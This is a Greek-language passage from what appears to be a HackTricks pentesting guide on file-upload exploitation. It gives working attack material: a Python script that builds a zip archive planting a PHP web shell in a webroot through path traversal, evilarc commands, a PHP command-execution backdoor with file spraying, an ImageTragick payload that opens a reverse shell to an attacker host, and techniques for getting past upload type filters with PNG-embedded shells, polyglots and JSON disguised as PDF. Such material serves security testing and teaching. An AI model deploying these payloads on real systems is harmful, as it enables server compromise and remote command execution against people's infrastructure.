Η απροσδόκητη δημιουργία αρχείων σε καταλόγους κατά την αποσυμπίεση αποτελεί σημαντικό πρόβλημα. Παρά τις αρχικές υποθέσεις ότι αυτή η διαμόρφωση μπορεί να προστατεύει από εκτέλεση εντολών σε επίπεδο OS μέσω κακόβουλων μεταφορτώσεων αρχείων, η υποστήριξη ιεραρχικής συμπίεσης και οι δυνατότητες directory traversal του μορφότυπου ZIP μπορούν να εκμεταλλευτούν. Αυτό επιτρέπει στους επιτιθέμενους να παρακάμψουν περιορισμούς και να διαφύγουν από ασφαλείς φακέλους μεταφόρτωσης, χειραγωγώντας τη λειτουργία αποσυμπίεσης της στοχευμένης εφαρμογής.

Ένα αυτοματοποιημένο exploit για τη δημιουργία τέτοιων αρχείων είναι διαθέσιμο στο [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Το εργαλείο μπορεί να χρησιμοποιηθεί όπως φαίνεται:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Επιπλέον, η **symlink trick with evilarc** είναι μια επιλογή. Εάν ο στόχος είναι να στοχεύσετε ένα αρχείο όπως το `/flag.txt`, θα πρέπει να δημιουργήσετε ένα symlink προς αυτό το αρχείο στο σύστημά σας. Αυτό διασφαλίζει ότι το evilarc δεν θα αντιμετωπίσει σφάλματα κατά τη λειτουργία του.

Παρακάτω υπάρχει ένα παράδειγμα Python code που χρησιμοποιείται για να δημιουργήσει ένα malicious zip file:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Κατάχρηση συμπίεσης για file spraying**

Για περισσότερες λεπτομέρειες **ελέγξτε το αρχικό post στο**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Δημιουργία PHP Shell**: Γράφεται PHP κώδικας για να εκτελεί εντολές που περνάνε μέσω της μεταβλητής `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying και Δημιουργία Συμπιεσμένου Αρχείου**: Δημιουργούνται πολλαπλά αρχεία και συναρμολογείται ένα αρχείο zip που τα περιέχει.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Τροποποίηση με Hex Editor ή vi**: Τα ονόματα των αρχείων μέσα στο zip τροποποιούνται χρησιμοποιώντας vi ή έναν hex editor, αλλάζοντας "xxA" σε "../" για να γίνει διάσχιση καταλόγων.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Ανεβάστε αυτό το περιεχόμενο με επέκταση εικόνας για να εκμεταλλευτείτε την ευπάθεια **(ImageMagick , 7.0.1-1)** (από το [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

Η ενσωμάτωση ενός PHP shell στο IDAT chunk ενός αρχείου PNG μπορεί να παρακάμψει αποτελεσματικά ορισμένες λειτουργίες επεξεργασίας εικόνας. Οι συναρτήσεις `imagecopyresized` και `imagecopyresampled` από PHP-GD είναι ιδιαίτερα σχετικές σε αυτό το πλαίσιο, καθώς χρησιμοποιούνται συνήθως για αλλαγή μεγέθους και επαναδειγματοληψία εικόνων, αντίστοιχα. Η ικανότητα του ενσωματωμένου PHP shell να παραμένει ανεπηρέαστο από αυτές τις λειτουργίες αποτελεί σημαντικό πλεονέκτημα για ορισμένα σενάρια.

A detailed exploration of this technique, including its methodology and potential applications, is provided in the following article: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). This resource offers a comprehensive understanding of the process and its implications.

Περισσότερες πληροφορίες: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files λειτουργούν ως ένα μοναδικό εργαλείο στην κυβερνοασφάλεια, ενεργώντας σαν χαμαιλέοντες που μπορούν νόμιμα να υπάρχουν σε πολλαπλές μορφές αρχείων ταυτόχρονα. Ένα ενδιαφέρον παράδειγμα είναι ένα [GIFAR](https://en.wikipedia.org/wiki/Gifar), ένα υβρίδιο που λειτουργεί και ως GIF και ως RAR archive. Τέτοια αρχεία δεν περιορίζονται σε αυτό το ζευγάρι· συνδυασμοί όπως GIF και JS ή PPT και JS είναι επίσης εφικτοί.

Η βασική χρησιμότητα των polyglot files βρίσκεται στην ικανότητά τους να παρακάμπτουν μέτρα ασφαλείας που φιλτράρουν αρχεία με βάση τον τύπο. Κοινή πρακτική σε διάφορες εφαρμογές είναι να επιτρέπονται μόνο ορισμένοι τύποι αρχείων για upload — όπως JPEG, GIF ή DOC — για να περιοριστεί ο κίνδυνος από δυνητικά επικίνδυνες μορφές (π.χ., JS, PHP ή Phar αρχεία). Ωστόσο, ένα polyglot, συμμορφούμενο με τα δομικά κριτήρια πολλαπλών τύπων αρχείων, μπορεί σιωπηλά να παρακάμψει αυτούς τους περιορισμούς.

Παρά την ευελιξία τους, τα polyglots αντιμετωπίζουν περιορισμούς. Για παράδειγμα, ενώ ένα polyglot μπορεί ταυτόχρονα να ενσωματώνει ένα PHAR αρχείο (PHp ARchive) και ένα JPEG, η επιτυχία του upload μπορεί να εξαρτηθεί από τις πολιτικές επέκτασης αρχείων της πλατφόρμας. Αν το σύστημα είναι αυστηρό όσον αφορά τις επιτρεπτές επεκτάσεις, η απλή δομική διπλότητα ενός polyglot μπορεί να μην αρκεί για να εγγυηθεί το upload.

Περισσότερες πληροφορίες: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Πώς να αποφύγετε τον εντοπισμό τύπου αρχείου ανεβάζοντας ένα έγκυρο JSON αρχείο ακόμη κι αν δεν επιτρέπεται, προσποιούμενοι ότι είναι PDF (τεχνικές από **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Εφόσον τα magic bytes `%PDF` βρίσκονται στα πρώτα 1024 bytes, θεωρείται έγκυρο (δείτε παράδειγμα στο άρθρο)
- **`pdflib` library**: Προσθέστε μια ψεύτικη PDF μορφή μέσα σε ένα πεδίο του JSON ώστε η βιβλιοθήκη να πιστέψει ότι είναι PDF (δείτε παράδειγμα στο άρθρο)
- **`file` binary**: Μπορεί να διαβάσει μέχρι 1048576 bytes από ένα αρχείο. Απλά δημιουργήστε ένα JSON μεγαλύτερο από αυτό ώστε να μην μπορεί να κάνει parse το περιεχόμενο ως json και στη συνέχεια βάλτε μέσα στο JSON το αρχικό μέρος ενός πραγματικού PDF και θα το θεωρήσει PDF

## Αναφορές

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
